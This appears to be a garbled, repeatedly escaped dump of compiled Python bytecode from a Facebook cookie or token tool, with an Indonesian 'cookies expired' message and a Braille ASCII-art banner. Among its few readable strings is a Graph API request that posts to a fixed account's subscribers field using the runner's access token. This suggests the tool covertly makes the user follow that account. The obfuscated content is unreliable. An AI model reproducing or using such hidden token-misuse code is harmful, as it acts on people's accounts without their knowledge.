\\\\\\\000c\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000s*\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\022t\\\\\\\\000\\\\\\\\240\\\\\\\\001d\\\\\\\\001t\\\\\\\\002\\\\\\\\026\\\\\\\\000\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\022\\\\\\\\004\\\\\\\\000t\\\\\\\\003y$\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)\\\\\\\\002NzMhttps://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s)\\\\\\\\004r\\\\\\\\271\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\004postr\\\\\\\\267\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000""\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003bot\\\\\\\\021\\\\\\\\004\\\\\\\\000\\\\\\\\000s\\\\\\\\020\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\377\\\\\\\\010\\\\\\\\003\\\\\\\\014\\\\\\\\001r\\\\\\\\350\\\\\\\\000\\\\\\\\000\\\\\\\\000c\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\005\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000s\\\\\\\\332\\\\\\\\000\\\\\\\\000\\\\\\\\000z t\\\\\\\\000d\\\\\\\\001d\\\\\\\\002\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\001\\\\\\\\241\\\\\\\\000}\\\\\\\\002t\\\\\\\\000d\\\\\\\\003d\"\"\\\\\\\\002\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\001\\\\\\\\241\\\\\\\\000}\\\\\\\\003W\\\\\\\\000n*\\\\\\\\004\\\\\\\\000t\\\\\\\\002yJ\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\003d\\\\\\\\004\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\004\\\\\\\\240\\\\\\\\005d\\\\\\\\005\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\006\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000t\\\\\\\\007\\\\\\\\240\\\\\\\\010d\\\\\\\\006\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\003d\\\\\\\\007\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\t\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\003d\\\\\\\\010\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\003d\\\\\\\\t\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\nd\\\\\\\\n\\\\\\\\203\\\\\\\\001}\\\\\\\\004|\\\\\\\\004d\\\\\\\\013v\\\\\\\\000r\\\\\\\\214t\\\\\\\\013\\\\\\\\203\\\"\\\"\\\\\\\\000\\\\\\\\001\\\\\\\\000nJ|\\\\\\\\004d\\\\\\\\014v\\\\\\\\000r\\\\\\\\234t\\\\\\\\014\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000n:|\\\\\\\\004d\\\\\\\\rv\\\\\\\\000r\\\\\\\\310t\\\\\\\\007\\\\\\\\240\\\\\\\\010d""\\\\\\\\016\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\007\\\\\\\\240\\\\\\\\010d\\\\\\\\017\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\003d\\\\\\\\020\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\r\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000n\\\\\\\\016t\\\\\\\\003d\\\\\\\\021\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\016\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)\\\\\\\\022Nr\\\\\\\\253\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\254\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\255\\\\\\\\000\\\\\\\\000\\\\\\\\000u\\\\\\\\030\\\\\\\\000\\\\\\\\000\\\\\\\\000[\\\\\\\\303\\\\\\\\227] Cookies Kadaluarsa \\\\\\\\351\\\\\\\\005\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\034\\\\\\\\000\\\\\\\\000\\\\\\\\000unnnnnnnnn\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\"\\\\\\\"\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240""\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\276\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\260\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\"\"\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\260\\\\\\\\342\\\\\\\\240\\\\\\\\213\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\230\\\\\\\\342\\\\\\\\243\\\\\\\\247\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\271\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\nnnnnnn\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342""\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\236\\\\\\\\342\"\"\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\274\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\273\\\\\\\\342\\\\\\\\243\\\\\\\\277\\\\\\\\342\\\\\\\\243\\\\\\\\277\\\\\\\\342\\\\\\\\241\\\\\\\\277\\\\\\\\342\\\\\\\\240\\\\\\\\230\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\"\\\\\\\"\\\\\\\\240\\\\\\\\271\\\\\\\\342\\\\\\\\243\\\\\\\\274\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\240\\\\\\\\342\\\\\\\\240\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\nn\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\240\\\\\\\\342\\\\\\\\241\\\\\\\\217\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\274\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\"\"\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\277\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\270\\\\\\\\342\\\\\\\\241\\\\\\\\204\\\\\\\\342\\\\\\\\240""\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\270\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\nn\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\264\\\\\\\\342\\\\\\\\240\\\\\\\\223\\\\\\\\342\\\\\\\\243\\\\\\\\276\\\\\\\\342\\\\\\\\243\\\\\\\\263\\\\\\\\342\\\\\\\\243\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\274\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240""\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\"\"\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\"\\\\\\\"\\\\\\\\342\\\\\\\\242\\\\\\\\273\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\203\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\"\\\"\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\270\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\243\\\\\\\\276\\\\\\\\342\\\\\\\\240\\\\\\\\203\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\221\\\\\\\\342\\\\\\\\241\\\\\\\\237\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\276""\\\\\\\\342\\\\\\\\240\\\\\\\\203\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\210\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\242\\\\\\\\270\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\nn\\\\\\\\342\\\\\\\\240""\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\263\\\\\\\\342\\\\\\\\241\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\230\\\\\\\\342\\\\\\\\243\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\274\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\"\\\"\\\\\\\\243\\\\\\\\277\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\267\\\\\\\\342\\\\\\\\241\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\231\\\\\\\\342\\\\\\\\242\\\\\\\\246\\\\\\\\342\\\\\\\\241\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240""\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\"\\\\\\\"\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\236\\\\\\\\342\\\\\\\\240\\\\\\\\201\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\270\\\\\\\\342\\\\\\\\240\\\\\\\\203\\\\\\\\342\\\\\\\\241\\\\\\\\217\"\"\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\242\\\\\\\\271\\\\\\\\342\\\\\\\\243\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\211\\\\\\\\342\\\\\\\\240\\\\\\\\223\\\\\\\\342\\\\\\\\240\\\\\\\\266\\\\\\\\342\\\\\\\\242\\\\\\\\204\\\\\\\\342\\\\\\\\241\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\240\\\\\\\\342\\\\\\\\240\\\\\\\\264\\\\\\\\342\\\\\\\\240\\\\\\\\213\\\\\\\\342\\\\\\\\240\\\\\\\\243\\\\\\\\342\\\\\\\\243\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342""\\\\\\\\242\\\\\\\\240\\\\\\\\342\\\\\\\\240\\\\\\\\237\\\\\\\\342\\\\\\\\243\\\\\\\\270\\\\\\\\342\\\\\\\\243\\\\\\\\247\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\243\\\\\\\\264\\\\\\\\342\\\\\\\\243\\\\\\\\277\\\\\\\\342\\\\\\\\240\\\\\\\\213\\\\\\\\342\\\\\\\\240\\\\\\\\230\\\\\\\\342\\\\\\\\243\\\\\\\\206\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\260\\\\\\\\342\\\\\\\\240\\\\\\\\266\\\\\\\\342\\\\\\\\240\\\\\\\\244\\\\\\\\342\\\\\\\\242\\\\\\\\215\\\\\\\\342\\\\\\\\243\\\\\\\\233\\\\\\\\342\\\\\\\\243\\\\\\\\266\\\\\\\\342\\\\\\\\240\\\\\\\\244\\\\\\\\342\\\\\\\\240\\\\\\\\277\\\\\\\\342\\\\\\\\243\\\\\\\\267\\\\\\\\342\\\\\\\\243\\\\\\\\246\\\\\\\\342\\\\\\\\241\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\222\\\\\\\\342\\\\\\\\240\\\\\\\\232\\\\\\\\342\\\\\\\\241\\\\\\\\237\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\210\\\\\\\\342\\\\\\\\240\\\\\\\\233\\\\\\\\342\\\\\\\\240\\\\\\\\242\\\\\\\\342\\\\\\\\240\\\\\\\\244\\\\\\\\342\\\\\\\\241\\\\\\\\204\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\264\\\\\\\\342\\\\\\\\242\\\\\\\\257\\\\\\\\342\\\\\\\\240\\\\\\\\264\\\\\\\\342\\\\\\\\243\\\\\\\\263\\\\\\\\342\\\\\\\\240\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\"\\\"\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\211\"\"\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\230\\\\\\\\342\\\\\\\\242\\\\\\\\246\\\\\\\\342\\\\\\\\241\\\\\\\\210""\\\\\\\\342\\\\\\\\240\\\\\\\\273\\\\\\\\342\\\\\\\\243\\\\\\\\226\\\\\\\\342\\\\\\\\240\\\\\\\\244\\\\\\\\342\\\\\\\\243\\\\\\\\244\\\\\\\\342\\\\\\\\243\\\\\\\\211\\\\\\\\342\\\\\\\\243\\\\\\\\211\\\\\\\\342\\\\\\\\243\\\\\\\\271\\\\\\\\342\\\\\\\\243\\\\\\\\257\\\\\\\\342\\\\\\\\243\\\\\\\\255\\\\\\\\342\\\\\\\\240\\\\\\\\211\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\241\\\\\\\\207\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\242\\\\\\\\240\\\\\\\\342\\\\\\\\243\\\\\\\\276\\\\\\\\342\\\\\\\\240\\\\\\\\233\\\\\\\\342\\\\\\\\243\\\\\\\\253\\\\\\\\342\\\\\\\\243\\\\\\\\274\\\\\\\\342\\\\\\\\240\\\\\\\\203\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\n\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\342\\\\\\\\240\\\\\\\\200\\\\\\\\